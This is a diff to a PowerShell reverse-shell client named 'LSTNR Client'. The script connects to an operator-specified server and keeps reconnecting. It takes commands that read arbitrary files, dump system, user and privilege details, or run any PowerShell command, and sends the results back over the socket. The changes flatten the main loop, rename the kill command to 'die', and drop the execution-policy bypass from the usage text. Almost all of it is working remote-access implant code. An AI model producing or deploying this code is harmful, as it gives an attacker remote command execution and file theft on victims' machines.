@@ -15,7 +15,7 @@ param(
 if ($Help) {
     Write-Host "LSTNR Client"
     Write-Host ""
-    Write-Host "Usage: powershell -ep bypass .\client.ps1 -Server <IP> -Port <PORT>"
+    Write-Host "Usage: .\client.ps1 -Server <IP> -Port <PORT>"
     Write-Host ""
     Write-Host "Parameters:"
     Write-Host "  -Server    Server IP address to connect to"
@@ -88,87 +88,76 @@ function Invoke-PowerShellCommand {
     }
 }
 
-function Start-Client {
-    while ($true) {
-        try {
-            $client = New-Object System.Net.Sockets.TcpClient
-            $client.Connect($Server, $Port)
+while ($true) {
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.Connect($Server, $Port)
+        
+        Write-Host "[+] Connected to $Server`:$Port"
+        
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        
+        # Send initial empty data
+        $writer.WriteLine()
+        $writer.Flush()
+        
+        while ($client.Connected) {
+            $command = $reader.ReadLine()
             
-            Write-Host "[+] Connected to $Server`:$Port"
+            if ([string]::IsNullOrEmpty($command)) { continue }
             
-            $stream = $client.GetStream()
-            $writer = New-Object System.IO.StreamWriter($stream)
-            $reader = New-Object System.IO.StreamReader($stream)
+            Write-Host "[*] Received command: $command"
             
-            # Send initial system information
-            $initialInfo = Get-SystemDetails
-            $writer.WriteLine($initialInfo)
-            $writer.Flush()
+            if ($command -eq "die") {
+                Write-Host "[!] Received kill-session command. Shutting down..."
+                if ($client -ne $null) { $client.Close() }
+                if ($writer -ne $null) { $writer.Close() }
+                if ($reader -ne $null) { $reader.Close() }
+                [Environment]::Exit(0)  # Force exit the script
+            }
             
-            while ($client.Connected) {
-                try {
-                    $command = $reader.ReadLine()
-                    
-                    if ([string]::IsNullOrEmpty($command)) { continue }
-                    
-                    Write-Host "[*] Received command: $command"
-                    
-                    $output = switch -Regex ($command) {
-                        "^kill-session$" {
-                            $client.Close()
-                            exit
-                        }
-                        "^getfile:(.*)" {
-                            $filepath = $matches[1]
-                            Get-FileContent -filepath $filepath
-                        }
-                        "^sysinfo$" {
-                            Get-SystemDetails
-                        }
-                        "^privileges$" {
-                            Get-WindowsPrivileges
-                        }
-                        "^whoami$" {
-                            "$env:USERDOMAIN\$env:USERNAME"
-                        }
-                        "^hostname$" {
-                            $env:COMPUTERNAME
-                        }
-                        "^osinfo$" {
-                            [System.Environment]::OSVersion.VersionString
-                        }
-                        default {
-                            Invoke-PowerShellCommand -command $command
-                        }
-                    }
-                    
-                    if ($output) {
-                        $writer.WriteLine($output)
-                        $writer.Flush()
-                    }
-                } catch [System.IO.IOException] {
-                    break
+            $output = switch -Regex ($command) {
+                "^getfile:(.*)" {
+                    $filepath = $matches[1]
+                    Get-FileContent -filepath $filepath
+                }
+                "^sysinfo$" {
+                    Get-SystemDetails
+                }
+                "^privileges$" {
+                    Get-WindowsPrivileges
+                }
+                "^whoami$" {
+                    "$env:USERDOMAIN\$env:USERNAME"
+                }
+                "^hostname$" {
+                    $env:COMPUTERNAME
+                }
+                "^osinfo$" {
+                    [System.Environment]::OSVersion.VersionString
+                }
+                default {
+                    Invoke-PowerShellCommand -command $command
                 }
             }
             
-        } catch {
-            Write-Host "[-] Connection failed: $_"
-        } finally {
-            if ($client -ne $null) {
-                $client.Close()
-            }
-            if ($writer -ne $null) {
-                $writer.Close()
-            }
-            if ($reader -ne $null) {
-                $reader.Close()
+            if ($output) {
+                $writer.WriteLine($output)
+                $writer.Flush()
             }
         }
-        
-        Write-Host "[*] Attempting to reconnect in $ReconnectDelay seconds..."
-        Start-Sleep -Seconds $ReconnectDelay
     }
-}
-
-# Start the client
-Start-Client 
+    catch {
+        Write-Host "[-] Connection failed: $_"
+    }
+    finally {
+        if ($client -ne $null) { $client.Close() }
+        if ($writer -ne $null) { $writer.Close() }
+        if ($reader -ne $null) { $reader.Close() }
+    }
+    
+    Write-Host "[*] Attempting to reconnect in $ReconnectDelay seconds..."
+    Start-Sleep -Seconds $ReconnectDelay
+} 
